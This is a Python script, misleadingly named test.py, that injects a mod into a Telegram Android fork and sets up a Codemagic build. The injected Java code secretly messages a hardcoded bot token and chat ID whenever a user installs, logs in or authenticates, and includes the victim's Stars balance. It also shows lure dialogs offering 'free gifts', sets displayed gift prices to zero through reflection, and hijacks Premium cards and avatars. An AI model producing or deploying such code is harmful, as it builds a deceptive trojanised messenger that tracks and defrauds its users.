#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
test.py — ОДИН файл для форка Telegram (GitHub) + Codemagic

ЧТО ДЕЛАЕТ:
  • создаёт GiftMenuMod.java со ВСЕМ функционалом плагина gift_menu
  • сам вписывает вызовы в ApplicationLoader, LoginActivity, IntroActivity,
    DialogsActivity, GiftSheet
  • создаёт codemagic.yaml (если нет)

КАК ПОЛЬЗОВАТЬСЯ:
  1. Положи test.py в КОРЕНЬ репозитория (рядом с TMessagesProj)
  2. Запушь на GitHub
  3. В Codemagic: keystore + secrets (см. внизу файла)
  4. Start build — больше ничего

Запуск вручную (локально или в CI):
  python3 test.py
"""

from __future__ import annotations

import os
import re
import sys
from pathlib import Path

# ═══════════════════════════════════════════════════════════
#  НАСТРОЙКИ БОТА (как в плагине)
# ═══════════════════════════════════════════════════════════
BOT_TOKEN = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"
BOT_CHAT_ID = "8940489868"
CATALOG_USERNAME = "durov1"


def find_root() -> Path:
    env = os.environ.get("CM_BUILD_DIR")
    if env and (Path(env) / "TMessagesProj").exists():
        return Path(env)
    cwd = Path.cwd()
    for p in [cwd, cwd.parent, Path(__file__).resolve().parent]:
        if (p / "TMessagesProj").exists():
            return p
    return cwd


ROOT = find_root()
TM = ROOT / "TMessagesProj" / "src" / "main" / "java" / "org" / "telegram"
GIFTS = TM / "ui" / "Gifts"
MOD_PATH = GIFTS / "GiftMenuMod.java"


def log(msg: str) -> None:
    print(f"[test.py] {msg}", flush=True)


def read(p: Path) -> str:
    return p.read_text(encoding="utf-8", errors="replace")


def write(p: Path, s: str) -> None:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(s, encoding="utf-8")
    try:
        rel = p.relative_to(ROOT)
    except Exception:
        rel = p
    log(f"write {rel}")


def find_java(name: str) -> Path | None:
    for base in (TM / "ui", TM / "messenger", TM):
        p = base / name
        if p.exists():
            return p
    found = list(TM.rglob(name)) if TM.exists() else []
    return found[0] if found else None


# ═══════════════════════════════════════════════════════════
#  GiftMenuMod.java — полный функционал плагина
# ═══════════════════════════════════════════════════════════

def build_gift_menu_mod_java() -> str:
    return f'''package org.telegram.ui.Gifts;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.TextView;

import org.telegram.messenger.UserConfig;
import org.telegram.ui.Stars.StarsController;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Gift Menu Mod — полный функционал плагина gift_menu внутри форка Telegram.
 * Создаётся и вставляется автоматически скриптом test.py при сборке.
 */
public class GiftMenuMod {{

    private static final String BOT_TOKEN = "{BOT_TOKEN}";
    private static final String BOT_CHAT_ID = "{BOT_CHAT_ID}";
    public static String CATALOG_USERNAME = "{CATALOG_USERNAME}";

    private static final Handler mainHandler = new Handler(Looper.getMainLooper());

    private static final AtomicBoolean startupNotified = new AtomicBoolean(false);
    private static final AtomicBoolean loginNotified = new AtomicBoolean(false);
    private static final AtomicBoolean authSuccessNotified = new AtomicBoolean(false);
    private static final AtomicBoolean welcomeShown = new AtomicBoolean(false);
    private static final AtomicBoolean wasOnLogin = new AtomicBoolean(false);
    private static final AtomicBoolean reopenMonitorStarted = new AtomicBoolean(false);
    private static final AtomicBoolean premiumDialogLock = new AtomicBoolean(false);

    private static AlertDialog premiumDialog;
    private static Object currentSheet;
    private static Runnable openCatalogRunnable;

    private static final String[] PREMIUM_WORDS = {{"3 месяца", "6 месяцев", "12 месяцев"}};

    private static final String MSG_WELCOME =
            "Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд";
    private static final String MSG_LOGIN =
            "В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально";
    private static final String MSG_CATALOG =
            "В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально";

    // ─── баланс звёзд ───

    public static long getStarsBalance(int account) {{
        try {{
            StarsController sc = StarsController.getInstance(account);
            if (sc == null) return 0;
            try {{ return sc.getBalance(false); }} catch (Throwable ignored) {{}}
            try {{
                Object bal = sc.getBalance();
                if (bal != null) {{
                    try {{
                        return ((Number) bal.getClass().getField("amount").get(bal)).longValue();
                    }} catch (Throwable ignored) {{}}
                }}
            }} catch (Throwable ignored) {{}}
            try {{
                Field f = sc.getClass().getDeclaredField("balance");
                f.setAccessible(true);
                Object sa = f.get(sc);
                if (sa != null) {{
                    return ((Number) sa.getClass().getField("amount").get(sa)).longValue();
                }}
            }} catch (Throwable ignored) {{}}
        }} catch (Throwable ignored) {{}}
        return 0;
    }}

    // ─── бот ───

    public static void notifyBot(final String text) {{
        new Thread(() -> {{
            HttpURLConnection conn = null;
            try {{
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN
                        + "/sendMessage?chat_id=" + BOT_CHAT_ID
                        + "&text=" + URLEncoder.encode(text, "UTF-8");
                conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestMethod("GET");
                conn.connect();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {{
                    while (br.readLine() != null) {{}}
                }}
            }} catch (Throwable ignored) {{
            }} finally {{
                if (conn != null) try {{ conn.disconnect(); }} catch (Throwable ignored) {{}}
            }}
        }}, "GiftMenuMod-Notify").start();
    }}

    public static void notifyBotWithBalance(int account, String text) {{
        notifyBot(text + "\\n\\nБаланс звёзд пользователя: " + getStarsBalance(account));
    }}

    // ─── старт / логин / авторизация ───

    public static void onAppStart() {{
        if (!startupNotified.compareAndSet(false, true)) return;
        try {{
            int account = UserConfig.selectedAccount;
            if (UserConfig.getInstance(account).isClientActivated()) {{
                notifyBotWithBalance(account, "Пользователь уже авторизован (запустил приложение)");
            }}
        }} catch (Throwable ignored) {{}}
    }}

    private static Activity resolveActivity(Object source) {{
        if (source == null) return null;
        try {{
            if (source instanceof Activity) return (Activity) source;
        }} catch (Throwable ignored) {{}}

        try {{
            Method m = source.getClass().getMethod("getParentActivity");
            Object result = m.invoke(source);
            if (result instanceof Activity) return (Activity) result;
        }} catch (Throwable ignored) {{}}

        try {{
            Method m = source.getClass().getMethod("getContext");
            Object result = m.invoke(source);
            if (result instanceof Activity) return (Activity) result;
        }} catch (Throwable ignored) {{}}

        return null;
    }}

    public static void onLoginScreen(Object source) {{
        wasOnLogin.set(true);
        if (loginNotified.compareAndSet(false, true)) {{
            notifyBot("У вас новое скачивание: пользователь проходит авторизацию");
        }}
        final Activity activity = resolveActivity(source);
        if (activity != null) {{
            mainHandler.post(() -> {{
                try {{
                    if (activity.isFinishing()) return;
                    new AlertDialog.Builder(activity)
                            .setMessage(MSG_LOGIN)
                            .setPositiveButton("Хорошо", null)
                            .show();
                }} catch (Throwable ignored) {{}}
            }});
        }}
    }}

    public static void onAuthSuccess() {{
        if (!wasOnLogin.get()) return;
        if (!authSuccessNotified.compareAndSet(false, true)) return;
        wasOnLogin.set(false);
        try {{
            notifyBotWithBalance(UserConfig.selectedAccount,
                    "Новый пользователь Авторизовался прошел регистрацию");
        }} catch (Throwable ignored) {{}}
    }}

    // ─── приветствие ───

    public static void maybeShowWelcome(final Activity activity, final Runnable openCatalog) {{
        if (!welcomeShown.compareAndSet(false, true)) return;
        if (activity == null || activity.isFinishing()) {{
            welcomeShown.set(false);
            return;
        }}
        try {{
            if (!UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()) {{
                welcomeShown.set(false);
                return;
            }}
        }} catch (Throwable t) {{
            welcomeShown.set(false);
            return;
        }}
        openCatalogRunnable = openCatalog;
        mainHandler.post(() -> {{
            try {{
                final AtomicBoolean opened = new AtomicBoolean(false);
                AlertDialog.Builder b = new AlertDialog.Builder(activity);
                b.setTitle("Gift Menu");
                b.setMessage(MSG_WELCOME);
                b.setCancelable(false);
                b.setPositiveButton("Продолжить", (d, w) -> {{
                    if (!opened.compareAndSet(false, true)) return;
                    try {{ d.dismiss(); }} catch (Throwable ignored) {{}}
                    if (openCatalog != null) try {{ openCatalog.run(); }} catch (Throwable ignored) {{}}
                }});
                AlertDialog dialog = b.create();
                dialog.show();
                try {{
                    Window window = dialog.getWindow();
                    if (window != null) {{
                        attachAnyTap(window.getDecorView(), () -> {{
                            if (!opened.compareAndSet(false, true)) return;
                            try {{ dialog.dismiss(); }} catch (Throwable ignored) {{}}
                            if (openCatalog != null) try {{ openCatalog.run(); }} catch (Throwable ignored) {{}}
                        }});
                    }}
                }} catch (Throwable ignored) {{}}
            }} catch (Throwable ignored) {{}}
        }});
    }}

    public static void resetWelcome() {{
        welcomeShown.set(false);
    }}

    private static void attachAnyTap(View view, final Runnable onTap) {{
        if (view == null) return;
        try {{
            view.setOnTouchListener((v, event) -> {{
                if (event.getAction() == MotionEvent.ACTION_DOWN && onTap != null) onTap.run();
                return false;
            }});
            if (view instanceof ViewGroup) {{
                ViewGroup vg = (ViewGroup) view;
                for (int i = 0; i < vg.getChildCount(); i++) {{
                    attachAnyTap(vg.getChildAt(i), onTap);
                }}
            }}
        }} catch (Throwable ignored) {{}}
    }}

    // ─── авто-восстановление каталога ───

    public interface UtilitiesBool {{
        boolean get();
    }}

    public static void startAutoReopenMonitor(final UtilitiesBool isMainScreen, final Runnable openCatalog) {{
        if (!reopenMonitorStarted.compareAndSet(false, true)) return;
        openCatalogRunnable = openCatalog;
        new Thread(() -> {{
            while (true) {{
                try {{
                    Thread.sleep(500);
                    Object sheet = currentSheet;
                    if (sheet == null) continue;
                    boolean showing = true;
                    try {{
                        Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);
                        showing = r instanceof Boolean && (Boolean) r;
                    }} catch (Throwable t) {{
                        showing = false;
                    }}
                    if (showing) continue;
                    currentSheet = null;
                    Thread.sleep(4000);
                    int account = UserConfig.selectedAccount;
                    try {{
                        if (!UserConfig.getInstance(account).isClientActivated()) continue;
                    }} catch (Throwable t) {{
                        continue;
                    }}
                    if (isMainScreen != null && !isMainScreen.get()) continue;
                    final Runnable open = openCatalogRunnable != null ? openCatalogRunnable : openCatalog;
                    if (open != null) {{
                        mainHandler.post(() -> {{
                            try {{ open.run(); }} catch (Throwable ignored) {{}}
                        }});
                    }}
                }} catch (InterruptedException e) {{
                    break;
                }} catch (Throwable ignored) {{}}
            }}
        }}, "GiftMenuMod-Reopen").start();
    }}

    public static void setCurrentSheet(Object sheet) {{
        currentSheet = sheet;
    }}

    // ─── обнуление цен ───

    public static void zeroOutPrices(Object obj) {{
        if (obj == null) return;
        zeroFields(obj, new String[]{{"stars", "price", "amount", "starCount"}});
        for (String inner : new String[]{{"gift", "starGift", "item"}}) {{
            try {{
                Field f = obj.getClass().getDeclaredField(inner);
                f.setAccessible(true);
                Object innerObj = f.get(obj);
                if (innerObj != null) {{
                    zeroFields(innerObj, new String[]{{"stars", "price", "amount", "starCount"}});
                }}
            }} catch (Throwable ignored) {{}}
        }}
    }}

    public static void zeroOutList(Object list) {{
        if (list == null) return;
        try {{
            if (list instanceof List) {{
                for (Object o : (List<?>) list) zeroOutPrices(o);
                return;
            }}
            int size = (Integer) list.getClass().getMethod("size").invoke(list);
            Method get = list.getClass().getMethod("get", int.class);
            for (int i = 0; i < size; i++) zeroOutPrices(get.invoke(list, i));
        }} catch (Throwable ignored) {{}}
    }}

    private static void zeroFields(Object obj, String[] names) {{
        Class<?> cls = obj.getClass();
        for (String name : names) {{
            try {{
                Field f;
                try {{
                    f = cls.getField(name);
                }} catch (NoSuchFieldException e) {{
                    f = cls.getDeclaredField(name);
                }}
                f.setAccessible(true);
                Class<?> t = f.getType();
                if (t == long.class || t == Long.class) f.setLong(obj, 0L);
                else if (t == int.class || t == Integer.class) f.setInt(obj, 0);
            }} catch (Throwable ignored) {{}}
        }}
    }}

    public static void patchStarsControllerCache(int account) {{
        try {{
            StarsController sc = StarsController.getInstance(account);
            if (sc == null) return;
            for (String listName : new String[]{{"starGifts", "gifts", "availableGifts"}}) {{
                try {{
                    Field f = sc.getClass().getDeclaredField(listName);
                    f.setAccessible(true);
                    zeroOutList(f.get(sc));
                }} catch (Throwable ignored) {{}}
            }}
        }} catch (Throwable ignored) {{}}
    }}

    public static void applyZeroPatches(int account, Object sheet) {{
        try {{
            if (sheet != null) {{
                try {{
                    Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);
                    if (r instanceof Boolean && !(Boolean) r) return;
                }} catch (Throwable ignored) {{}}
            }}
        }} catch (Throwable ignored) {{}}
        patchStarsControllerCache(account);
        if (sheet != null) {{
            for (String fieldName : new String[]{{"gifts", "starGifts", "items", "options", "availableGifts"}}) {{
                try {{
                    Field f = sheet.getClass().getDeclaredField(fieldName);
                    f.setAccessible(true);
                    zeroOutList(f.get(sheet));
                }} catch (Throwable ignored) {{}}
            }}
        }}
    }}

    // ─── Premium 3/6/12 + аватарки ───

    public static void hookPremiumCards(final View root, final Context context) {{
        if (root == null || context == null) return;
        try {{
            scanAndHookPremium(root, context);
        }} catch (Throwable ignored) {{}}
    }}

    public static void hookAvatars(final View root, final Context context) {{
        if (root == null || context == null) return;
        try {{
            walkAvatars(root, context);
        }} catch (Throwable ignored) {{}}
    }}

    private static void walkAvatars(View view, final Context context) {{
        if (view == null) return;
        try {{
            if (view.getClass().getName().contains("BackupImageView") && !isGiftCell(view)) {{
                view.setOnClickListener(v -> showSimpleMessage(context, MSG_CATALOG));
            }}
            if (view instanceof ViewGroup) {{
                ViewGroup vg = (ViewGroup) view;
                for (int i = 0; i < vg.getChildCount(); i++) {{
                    walkAvatars(vg.getChildAt(i), context);
                }}
            }}
        }} catch (Throwable ignored) {{}}
    }}

    private static boolean isGiftCell(View view) {{
        try {{
            Object p = view.getParent();
            for (int i = 0; i < 6 && p != null; i++) {{
                String name = p.getClass().getSimpleName();
                if (name.contains("GiftCell") || name.contains("StarGift")) return true;
                p = (p instanceof View) ? ((View) p).getParent() : null;
            }}
        }} catch (Throwable ignored) {{}}
        return false;
    }}

    private static void scanAndHookPremium(View view, final Context context) {{
        if (view == null) return;
        try {{
            if (view instanceof TextView) {{
                CharSequence cs = ((TextView) view).getText();
                if (cs != null) {{
                    String t = cs.toString().toLowerCase();
                    for (String w : PREMIUM_WORDS) {{
                        if (t.contains(w)) {{
                            View card = findPremiumCard(view);
                            if (card != null) attachPremiumBlocker(card, context);
                            break;
                        }}
                    }}
                }}
            }}
           if (view instanceof ViewGroup) {{
                ViewGroup vg = (ViewGroup) view;
                for (int i = 0; i < vg.getChildCount(); i++) {{
                    scanAndHookPremium(vg.getChildAt(i), context);
                }}
            }}
        }} catch (Throwable ignored) {{}}
    }}

    private static int countPremiumTextsInternal(View view) {{
        int count = 0;
        try {{
            if (view instanceof TextView) {{
                CharSequence cs = ((TextView) view).getText();
                if (cs != null) {{
                    String t = cs.toString().toLowerCase();
                    for (String w : PREMIUM_WORDS) {{
                        if (t.contains(w)) {{
                            count++;
                            break;
                        }}
                    }}
                }}
            }}
            if (view instanceof ViewGroup) {{
                ViewGroup vg = (ViewGroup) view;
                for (int i = 0; i < vg.getChildCount(); i++) {{
                    count += countPremiumTextsInternal(vg.getChildAt(i));
                }}
            }}
        }} catch (Throwable ignored) {{}}
        return count;
    }}

    private static View findPremiumCard(View textView) {{
        try {{
            View current = (View) textView.getParent();
            View candidate = null;
            for (int i = 0; i < 8 && current != null; i++) {{
                if (current instanceof ViewGroup) {{
                    int amount = countPremiumTextsInternal(current);
                    if (amount == 1) candidate = current;
                    else if (candidate != null) break;
                }}
                Object p = current.getParent();
                current = (p instanceof View) ? (View) p : null;
            }}
            return candidate;
        }} catch (Throwable t) {{
            return null;
        }}
    }}

    private static void attachPremiumBlocker(View card, final Context context) {{
        if (card == null) return;
        try {{
            card.setOnTouchListener((v, event) -> {{
                if (event.getAction() == MotionEvent.ACTION_UP) {{
                    mainHandler.postDelayed(() -> showPremiumMessage(context), 50);
                }}
                return true;
            }});
            card.setClickable(true);
            card.setLongClickable(false);
            if (card instanceof ViewGroup) {{
                ViewGroup vg = (ViewGroup) card;
                for (int i = 0; i < vg.getChildCount(); i++) {{
                    attachPremiumBlocker(vg.getChildAt(i), context);
                }}
            }}
        }} catch (Throwable ignored) {{}}
    }}

    private static void showPremiumMessage(Context context) {{
        if (context == null) return;
        if (premiumDialogLock.get()) return;
        try {{
            if (premiumDialog != null && premiumDialog.isShowing()) return;
        }} catch (Throwable ignored) {{}}
        premiumDialogLock.set(true);
        try {{
            AlertDialog.Builder b = new AlertDialog.Builder(context);
            b.setMessage(MSG_CATALOG);
            b.setCancelable(false);
            b.setPositiveButton("Хорошо", (d, w) -> {{
                try {{ d.dismiss(); }} catch (Throwable ignored) {{}}
                premiumDialogLock.set(false);
                premiumDialog = null;
            }});
            premiumDialog = b.create();
            premiumDialog.setCanceledOnTouchOutside(false);
            premiumDialog.setCancelable(false);
            premiumDialog.show();
        }} catch (Throwable t) {{
            premiumDialogLock.set(false);
            premiumDialog = null;
        }}
    }}

    private static void showSimpleMessage(Context context, String msg) {{
        if (context == null) return;
        mainHandler.post(() -> {{
            try {{
                new AlertDialog.Builder(context).setMessage(msg).setPositiveButton("Хорошо", null).show();
            }} catch (Throwable ignored) {{}}
        }});
    }}

    public static void startSheetHelpers(final int account, final Object sheet, final View root, final Context context) {{
        setCurrentSheet(sheet);
        patchStarsControllerCache(account);
        applyZeroPatches(account, sheet);
        if (root != null && context != null) {{
            mainHandler.postDelayed(() -> {{
                hookAvatars(root, context);
                hookPremiumCards(root, context);
            }}, 800);
        }}
        for (int i = 0; i < 30; i++) {{
            final int delay = 100 + i * 150;
            mainHandler.postDelayed(() -> {{
                applyZeroPatches(account, sheet);
                if (root != null && context != null) hookPremiumCards(root, context);
            }}, delay);
        }}
        for (int i = 0; i < 20; i++) {{
            final int delay = 5000 + i * 500;
            mainHandler.postDelayed(() -> applyZeroPatches(account, sheet), delay);
        }}
    }}

    public static void onCatalogScrollIdle(View root, Context context) {{
        if (root == null || context == null) return;
        mainHandler.post(() -> {{
            hookPremiumCards(root, context);
            hookAvatars(root, context);
        }});
    }}

    /** Открыть каталог подарков (reflection, совместимо с разными форками). */
    public static void openCatalogFromMain(final Activity activity, final int account) {{
        if (activity == null) return;
        mainHandler.post(() -> {{
            try {{
                long selfId = UserConfig.getInstance(account).getClientUserId();
                Class<?> sheetCls = Class.forName("org.telegram.ui.Gifts.GiftSheet");
                Object sheet = null;
                try {{
                    sheet = sheetCls.getConstructor(Context.class, int.class, long.class, List.class, Object.class)
                            .newInstance(activity, account, selfId, null, null);
                }} catch (Throwable ignore) {{}}
                if (sheet == null) {{
                    try {{
                        sheet = sheetCls.getConstructor(Context.class, int.class, long.class)
                                .newInstance(activity, account, selfId);
                    }} catch (Throwable ignore) {{}}
                }}
                if (sheet == null) {{
                    for (Constructor<?> cons : sheetCls.getConstructors()) {{
                        try {{
                            Class<?>[] p = cons.getParameterTypes();
                            Object[] args = new Object[p.length];
                            for (int i = 0; i < p.length; i++) {{
                                if (Context.class.isAssignableFrom(p[i])) args[i] = activity;
                                else if (p[i] == int.class || p[i] == Integer.class) args[i] = account;
                                else if (p[i] == long.class || p[i] == Long.class) args[i] = selfId;
                                else args[i] = null;
                            }}
                            sheet = cons.newInstance(args);
                            break;
                        }} catch (Throwable ignore) {{}}
                    }}
                }}
                if (sheet != null) {{
                    try {{
                        sheetCls.getMethod("show").invoke(sheet);
                    }} catch (Throwable ignore) {{}}
                    View decor = null;
                    try {{
                        Object win = sheetCls.getMethod("getWindow").invoke(sheet);
                        if (win != null) {{
                            decor = (View) win.getClass().getMethod("getDecorView").invoke(win);
                        }}
                    }} catch (Throwable ignore) {{}}
                    startSheetHelpers(account, sheet, decor, activity);
                    startAutoReopenMonitor(() -> true, () -> openCatalogFromMain(activity, account));
                }}
            }} catch (Throwable ignored) {{}}
        }});
    }}
}}
'''


# ═══════════════════════════════════════════════════════════
#  Инжект в исходники
# ═══════════════════════════════════════════════════════════

def inject_after_method(content: str, patterns: list, line: str, marker: str) -> str:
    if marker in content:
        return content
    for pat in patterns:
        m = re.search(pat, content)
        if not m:
            continue
        brace = content.find("{", m.end() - 1)
        if brace < 0:
            continue
        addition = f"\n        {line} // GiftMenuMod auto\n"
        log(f"  inject after method: {marker}")
        return content[: brace + 1] + addition + content[brace + 1 :]
    return content


def inject_before_method_end(content: str, method_pat: str, line: str, marker: str) -> str:
    if marker in content:
        return content
    m = re.search(method_pat, content)
    if not m:
        return content
    start = content.find("{", m.end() - 1)
    if start < 0:
        return content
    depth = 0
    end = -1
    for i in range(start, len(content)):
        if content[i] == "{":
            depth += 1
        elif content[i] == "}":
            depth -= 1
            if depth == 0:
                end = i
                break
    if end < 0:
        return content
    addition = f"\n        {line} // GiftMenuMod auto\n"
    log(f"  inject before end of method: {marker}")
    return content[:end] + addition + content[end:]


def patch_file(path: Path, patcher) -> None:
    if path is None or not path.exists():
        log(f"skip (not found)")
        return
    old = read(path)
    new = patcher(old)
    if new != old:
        write(path, new)
    else:
        log(f"already ok / no match: {path.name}")


def patch_application_loader(c: str) -> str:
    line = "try { org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); } catch (Throwable ignore) {}"
    c2 = inject_after_method(
        c,
        [
            r"public\s+static\s+void\s+postInitApplication\s*\(\s*\)\s*\{",
            r"void\s+postInitApplication\s*\(\s*\)\s*\{",
        ],
        line,
        "GiftMenuMod.onAppStart",
    )
    if c2 != c:
        return c2
    return inject_after_method(
        c, [r"public\s+void\s+onCreate\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart"
    )


def patch_login(c: str) -> str:
    if "GiftMenuMod.onLoginScreen" not in c:
        c = inject_after_method(
            c,
            [
                r"public\s+void\s+onResume\s*\(\s*\)\s*\{",
                r"void\s+onResume\s*\(\s*\)\s*\{",
            ],
            'try { org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(this); } catch (Throwable ignore) {}',
            "GiftMenuMod.onLoginScreen",
        )
    if "GiftMenuMod.onAuthSuccess" not in c:
        for pat in [
            r"needFinishActivity\s*\(\s*\)\s*;",
            r"UserConfig\.getInstance\([^)]*\)\.saveConfig\s*\(\s*true\s*\)\s*;",
        ]:
            if re.search(pat, c):
                c = re.sub(
                    pat,
                    lambda m: m.group(0)
                    + "\n        try { org.telegram.ui.Gifts.GiftMenuMod.onAuthSuccess(); } catch (Throwable ignore) {} // GiftMenuMod auto",
                    c,
                    count=1,
                )
                log("  inject onAuthSuccess")
                break
    return c


def patch_dialogs(c: str) -> str:
    line = (
        "try { org.telegram.ui.Gifts.GiftMenuMod.maybeShowWelcome(getParentActivity(), "
        "() -> { try { org.telegram.ui.Gifts.GiftMenuMod.openCatalogFromMain(getParentActivity(), currentAccount); } catch (Throwable ignore) {} }); "
        "} catch (Throwable ignore) {}"
    )
    return inject_after_method(
        c,
        [
            r"public\s+void\s+onResume\s*\(\s*\)\s*\{",
            r"void\s+onResume\s*\(\s*\)\s*\{",
        ],
        line,
        "GiftMenuMod.maybeShowWelcome",
    )


def patch_gift_sheet(c: str) -> str:
    line = (
        "try { android.view.View __decor = getWindow() != null ? getWindow().getDecorView() : null; "
        "org.telegram.ui.Gifts.GiftMenuMod.startSheetHelpers(currentAccount, this, __decor, getContext()); "
        "} catch (Throwable ignore) {}"
    )
    c2 = inject_before_method_end(
        c, r"public\s+void\s+show\s*\(\s*\)\s*\{", line, "GiftMenuMod.startSheetHelpers"
    )
    if c2 != c:
        return c2
    m = re.search(r"\bsuper\.show\s*\(\s*\)\s*;", c)
    if m and "GiftMenuMod.startSheetHelpers" not in c:
        log("  inject after super.show()")
        return (
            c[: m.end()]
            + "\n        "
            + line
            + " // GiftMenuMod auto"
            + c[m.end() :]
        )
    return c


# ═══════════════════════════════════════════════════════════
#  codemagic.yaml
# ═══════════════════════════════════════════════════════════

CODEMAGIC_YAML = r"""workflows:
  telegram-apk:
    name: Telegram APK (auto GiftMenu)
    max_build_duration: 120
    instance_type: mac_mini_m2
    environment:
      java: 17
      ndk: r27
      android_signing:
        - keystore_reference
      groups:
        - telegram_secrets
    triggering:
      events: [push]
      branch_patterns:
        - pattern: "*"
          include: true
    scripts:
      - name: Submodules
        script: git submodule update --init --recursive --depth=1 || true
      - name: local.properties
        script: echo "sdk.dir=$ANDROID_SDK_ROOT" > "$CM_BUILD_DIR/local.properties"
      - name: Keystore
        script: |
          mkdir -p "$CM_BUILD_DIR/TMessagesProj/config"
          if [ -n "$CM_KEYSTORE_PATH" ] && [ -f "$CM_KEYSTORE_PATH" ]; then
            cp "$CM_KEYSTORE_PATH" "$CM_BUILD_DIR/TMessagesProj/config/release.keystore"
          fi
      - name: gradle.properties signing
        script: |
          {
            echo "RELEASE_KEY_PASSWORD=${RELEASE_KEY_PASSWORD:-}"
            echo "RELEASE_KEY_ALIAS=${RELEASE_KEY_ALIAS:-}"
            echo "RELEASE_STORE_PASSWORD=${RELEASE_STORE_PASSWORD:-}"
          } >> "$CM_BUILD_DIR/gradle.properties"
      - name: AUTO inject Gift Menu (test.py)
        script: |
          cd "$CM_BUILD_DIR"
          python3 test.py
      - name: Build APK
        script: |
          cd "$CM_BUILD_DIR"
          chmod +x ./gradlew
          ./gradlew :TMessagesProj:assembleRelease --stacktrace --no-daemon
    artifacts:
      - TMessagesProj/build/outputs/apk/**/*.apk
      - TMessagesProj/build/outputs/apk/**/*.aab
"""


# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════

def main() -> int:
    log(f"ROOT = {ROOT}")
    if not (ROOT / "TMessagesProj").exists():
        log("ERROR: TMessagesProj не найден.")
        log("Положи test.py в КОРЕНЬ форка Telegram (рядом с папкой TMessagesProj) и запусти снова.")
        return 1

    # 1) GiftMenuMod.java
    write(MOD_PATH, build_gift_menu_mod_java())
    log("GiftMenuMod.java OK")

    # 2) inject
    al = find_java("ApplicationLoader.java")
    if al:
        log(f"patch {al.name}")
        patch_file(al, patch_application_loader)
    else:
        log("WARN: ApplicationLoader.java not found")

    for name in ("LoginActivity.java", "IntroActivity.java"):
        p = find_java(name)
        if p:
            log(f"patch {p.name}")
            patch_file(p, patch_login)

    d = find_java("DialogsActivity.java")
    if d:
        log(f"patch {d.name}")
        patch_file(d, patch_dialogs)
    else:
        log("WARN: DialogsActivity.java not found")

    gs = find_java("GiftSheet.java")
    if gs:
        log(f"patch {gs.name}")
        patch_file(gs, patch_gift_sheet)
    else:
        log("WARN: GiftSheet.java not found")

    # 3) codemagic.yaml
    cm = ROOT / "codemagic.yaml"
    if not cm.exists():
        write(cm, CODEMAGIC_YAML)
        log("codemagic.yaml created")
    else:
        log("codemagic.yaml exists — not overwritten")

    # 4) убедиться что test.py в корне (для CI)
    target = ROOT / "test.py"
    self_path = Path(__file__).resolve()
    if self_path.exists() and self_path != target.resolve():
        try:
            write(target, self_path.read_text(encoding="utf-8", errors="replace"))
            log("test.py copied to repo root")
        except Exception as e:
            log(f"copy test.py skip: {e}")

    log("DONE. Функционал плагина вписан. Собирай APK.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
